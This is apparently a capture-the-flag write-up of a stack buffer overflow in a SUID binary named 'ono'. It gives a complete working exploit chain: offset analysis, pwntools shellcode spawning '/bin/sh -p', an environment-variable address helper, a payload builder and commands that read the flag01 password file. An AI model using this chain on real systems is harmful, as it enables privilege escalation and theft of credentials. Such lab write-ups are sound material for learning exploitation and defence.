# `ono` — SUID Stack Buffer Overflow (level01 → flag01)

## Summary

`ono` is a SUID binary (owner `flag01`, group `level01`) that uses `gets()`
to read user input into a fixed-size stack buffer with no bounds checking.
This is a classic stack buffer overflow that lets a `level01` user overwrite
the saved return address and redirect execution into attacker-controlled
shellcode, spawning a privileged shell as `flag01`.

## Target details

```
-rwsr-x--- 1 flag01  level01 16792 Jun  9 23:13 ono
-r--r--r-- 1 level01 level01  2416 Jun  9 23:13 ono.c
```

Vulnerable code (`run_diagnostic` in `ono.c`):

```c
char credentials[64];
...
gets(credentials);   // no bounds checking — classic overflow
```

## Binary protections (`checksec`)

| Protection | Status                     | Impact                                   |
|------------|-----------------------------|-------------------------------------------|
| Canary     | Absent                      | No stack canary to leak/bypass            |
| PIE        | Disabled (base `0x400000`)  | Code addresses are fixed                  |
| NX / Stack | Executable (RWX)            | Shellcode can run directly on the stack   |
| RELRO      | Partial                     | Not needed for this exploit               |
| ASLR (OS)  | Disabled (`randomize_va_space=0`) | Stack addresses are deterministic  |
| CET (IBT/SHSTK) | Marked in ELF, not enforced at runtime | Return-address overwrite worked, so shadow stack wasn't actively enforced |

This combination (no canary, no PIE, no ASLR, executable stack) makes a
classic shellcode-on-stack exploit straightforward — no leaks or ROP chains
required.

## Step 1 — Find the offset to the return address

`gdb` was not available, so the offset was found via static disassembly:

```bash
objdump -d ono -M intel --disassemble=run_diagnostic
```

Relevant instruction:

```
lea    rax,[rbp-0x50]      ; credentials[] starts at rbp-0x50 (80 bytes before rbp)
```

Stack layout for `run_diagnostic`:

```
[ credentials: 80 bytes ]   <- rbp-0x50 .. rbp
[ saved rbp:    8 bytes ]   <- at rbp
[ return addr:  8 bytes ]   <- at rbp+8   <-- overflow target
```

**Total offset to the return address: 88 bytes.**

## Step 2 — Place shellcode at a known, exact address

Since ASLR and PIE are both off, addresses are deterministic — so instead of
guessing a stack address for a NOP sled, the shellcode was placed in an
**environment variable** and its exact runtime address computed directly.

**2a. Generate shellcode and export it as an env var**

```bash
python3 -c "
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.execve('/bin/sh', ['/bin/sh', '-p'], 0))
payload = b'\x90' * 200 + shellcode
import sys
sys.stdout.buffer.write(payload)
" > /tmp/sc.bin

export SHELLCODE=$(cat /tmp/sc.bin)
```

`/bin/sh -p` (privileged mode) is used instead of a plain `execve('/bin/sh')`
because a normal shell detects `euid != ruid` (true here, since `ono` is
SUID) and automatically drops privileges back to the real UID on startup.
`-p` tells the shell not to do that, preserving the elevated `euid`.

**2b. Compute the exact address of the env var as `ono` will see it**

Environment variable addresses shift slightly based on `argv[0]` length, so
a small helper program computes the corrected address rather than reading
`/proc/<pid>/maps` (which is blocked for SUID processes — the kernel marks
them non-dumpable, so `/proc/<pid>/maps`, `/proc/<pid>/mem`, etc. become
root-only regardless of file permissions shown by `ls`).

```c
// getenvaddr.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;
    if (argc < 3) {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%s will be at %p\n", argv[1], ptr);
    return 0;
}
```

```bash
gcc -o /tmp/getenvaddr /tmp/getenvaddr.c -fno-stack-protector -no-pie
/tmp/getenvaddr SHELLCODE ./ono
# -> SHELLCODE will be at 0x7fffffffe502
```

## Step 3 — Build and fire the payload

```python
#!/usr/bin/env python3
import struct

OFFSET_TO_RBP = 80
RET_ADDR = 0x7fffffffe502      # exact address from getenvaddr, same shell session

payload  = b'A' * OFFSET_TO_RBP            # padding up to saved RBP
payload += b'B' * 8                         # overwritten saved RBP (value irrelevant)
payload += struct.pack('<Q', RET_ADDR)      # overwritten return address
payload += struct.pack('<Q', RET_ADDR)      # repeated once for margin

with open('/tmp/payload', 'wb') as f:
    f.write(payload)
```

```bash
python3 /tmp/build_payload.py
(cat /tmp/payload; cat) | ./ono
```

The `(cat /tmp/payload; cat) | ./ono` pattern sends the overflow payload
first, then keeps stdin open (via the trailing `cat`) so the spawned shell
stays interactive instead of immediately hitting EOF and exiting.

## Step 4 — Confirm privilege escalation and grab the flag

```bash
id
# uid=1001(level01) euid=1002(flag01) ...

cat /home/flag01/.pass
```

## Key lessons

- `gets()` is inherently unsafe — always the first thing to grep for in
  challenge source.
- With ASLR + PIE off and an executable stack, you don't need leaks or
  ROP — direct shellcode injection works.
- `/proc/<pid>/maps` is unreadable for SUID processes (non-dumpable flag) —
  use static disassembly + the env-var address trick instead of relying on
  `gdb` or `/proc` inspection.
- A plain `execve("/bin/sh")` from a SUID context drops privileges; use
  `/bin/sh -p` to keep the escalated `euid`.
- ELF-level CET markings (IBT/SHSTK) don't guarantee runtime enforcement —
  verify empirically rather than assuming they block a classic overwrite.